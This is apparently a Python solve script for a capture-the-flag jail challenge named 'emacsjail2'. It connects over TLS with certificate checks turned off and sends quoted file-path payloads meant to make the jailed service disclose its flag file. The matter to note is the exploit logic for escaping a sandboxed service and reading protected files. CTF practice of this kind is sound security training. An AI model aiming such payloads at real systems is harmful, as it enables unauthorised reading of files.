#!/usr/bin/env python3
import argparse
import re
import socket
import ssl
import sys
import time

DEFAULT_HOST = "emacsjail2.chal.uiuc.tf"
DEFAULT_PORT = 1337

FLAG_RE = re.compile(rb"uiuctf\{[^}\r\n ]+\}")

PAYLOADS = [
    b'"/flag.txt"\n',
    b'"flag.txt"\n',
    b'"/challenge/flag.txt"\n',
]


def recv_some(sock, timeout=0.8):
    sock.settimeout(timeout)
    out = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            out += chunk
            sys.stdout.buffer.write(chunk)
            sys.stdout.buffer.flush()
        except socket.timeout:
            break
        except ssl.SSLWantReadError:
            break
    return out


def recv_until(sock, marker=b"Input:", timeout=30):
    end = time.time() + timeout
    data = b""

    while time.time() < end:
        data += recv_some(sock, timeout=0.5)
        if marker in data:
            break

    return data


def recv_all(sock, timeout=90):
    end = time.time() + timeout
    data = b""

    while time.time() < end:
        chunk = recv_some(sock, timeout=0.5)
        if chunk:
            data += chunk
            if FLAG_RE.search(data):
                break
        else:
            continue

    return data


def connect_tls(host, port):
    raw = socket.create_connection((host, port), timeout=20)

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    return ctx.wrap_socket(raw, server_hostname=host)


def run_payload(host, port, payload):
    print(f"[*] connecting to {host}:{port} over TLS", file=sys.stderr)

    sock = connect_tls(host, port)

    banner = recv_until(sock, b"Input:", timeout=40)

    if b"proof-of-work" in banner.lower() and b"disabled" not in banner.lower():
        print("[!] PoW aktif. Selesaikan PoW manual dulu.", file=sys.stderr)
        sock.close()
        return None

    print(f"[*] sending payload: {payload!r}", file=sys.stderr)
    sock.sendall(payload)

    out = recv_all(sock, timeout=90)
    sock.close()

    full = banner + out
    m = FLAG_RE.search(full)

    if m:
        return m.group(0).decode(errors="replace")

    return None


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("mode", nargs="?", default="REMOTE")
    parser.add_argument("kv", nargs="*")
    args = parser.parse_args()

    host = DEFAULT_HOST
    port = DEFAULT_PORT

    for item in args.kv:
        if item.startswith("HOST="):
            host = item.split("=", 1)[1]
        elif item.startswith("PORT="):
            port = int(item.split("=", 1)[1])

    for i, payload in enumerate(PAYLOADS, 1):
        print(f"[*] try payload {i}/{len(PAYLOADS)}", file=sys.stderr)

        flag = run_payload(host, port, payload)

        if flag:
            print(f"\n<FLAG>{flag}</FLAG>")
            return 0

        print("[!] belum dapet flag, coba payload berikutnya", file=sys.stderr)

    print("[!] semua payload gagal", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
